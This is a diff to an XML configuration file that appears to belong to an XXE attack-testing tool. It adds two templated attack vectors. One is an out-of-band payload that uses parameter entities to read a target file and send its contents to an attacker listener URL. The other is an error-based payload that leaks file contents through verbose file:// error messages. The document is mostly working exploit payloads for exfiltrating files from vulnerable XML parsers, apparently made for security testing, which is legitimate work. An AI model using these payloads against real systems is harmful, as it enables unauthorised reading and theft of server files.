@@ -439,4 +439,77 @@ xsi:schemaLocation="§tf_listenURL§">4</ttt:data>]]></directMessage>
     </attackvector>
     </attackvectors>
     </config>
+    <config>
+        <name>FileAccess: Out-of-Band channels (schemaEntity)</name>
+        <description>This vector exploits attribute normalization to transmit external resources that may contain newlines and special character by means of parameter entities and noNamespaceSchemaLocation. Similar technique could be used with xInclude or SchemaLocation.</description>
+        <params>
+            <dosbox>false</dosbox>
+            <targetFile>true</targetFile>
+            <helperURL>true</helperURL>
+            <attackListenerURL>true</attackListenerURL>
+            <externalResources>true</externalResources>
+            <encoding>UTF-8</encoding>
+        </params>
+        <attackvectors>
+        <attackvector type="system" default="true">
+        <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "§tf_helperURL§">
+%remote;
+]>
+<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="§tf_listenURL§/&internal;"></data>]]></directMessage>
+        <helperMessage><![CDATA[<!ENTITY % payload SYSTEM "§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY internal ’%payload;’>">
+%param1;]]></helperMessage>
+        </attackvector>
+        <attackvector type="public">
+        <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY % remote PUBLIC "p" "§tf_helperURL§">
+%remote;]>
+<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="§tf_listenURL§/&internal;"></data>]]></directMessage>
+        <helperMessage><![CDATA[<!ENTITY % payload PUBLIC "p2" "§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY internal ’%payload;’>">
+%param1;]]></helperMessage>
+        </attackvector>
+        </attackvectors>
+    </config>
+    <config>
+        <name>FileAccess: Exploiting verbose error messages</name>
+        <description>In some cases verbose error messages can be tricked into including data from external resources. This vector refers to an invalid file:// handler to provoke an error message that includes the contents of a target file. See "Pre-authentication XXE vulnerability in the Services Drupal module", Dubourguais, 2015</description>
+        <params>
+            <dosbox>false</dosbox>
+            <targetFile>true</targetFile>
+            <helperURL>true</helperURL>
+            <attackListenerURL>true</attackListenerURL>
+            <externalResources>true</externalResources>
+            <encoding>UTF-8</encoding>
+        </params>
+        <attackvectors>
+        <attackvector type="system" default="true">
+        <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "§tf_helperURL§">
+%remote;
+%intern;
+%trick;
+]>
+<data>42</data>
+]]></directMessage>
+        <helperMessage><![CDATA[<!ENTITY % payload SYSTEM "§tf_targetFILE§">
+<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'file:///no/such/file/exists/%payload;'>">
+]]></helperMessage>
+        </attackvector>
+        <attackvector type="public">
+        <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY % remote PUBLIC "p" "§tf_helperURL§">
+%remote;
+%intern;
+%trick;
+]>
+<data>42</data>
+]]></directMessage>
+        <helperMessage><![CDATA[<!ENTITY % payload PUBLIC "p1" "§tf_targetFILE§">
+<!ENTITY % intern "<!ENTITY &#37; trick PUBLIC "p2" 'file://no/such/file/exists/%payload;'>">
+]]></helperMessage>
+        </attackvector>
+        </attackvectors>
+    </config>
 </configs>
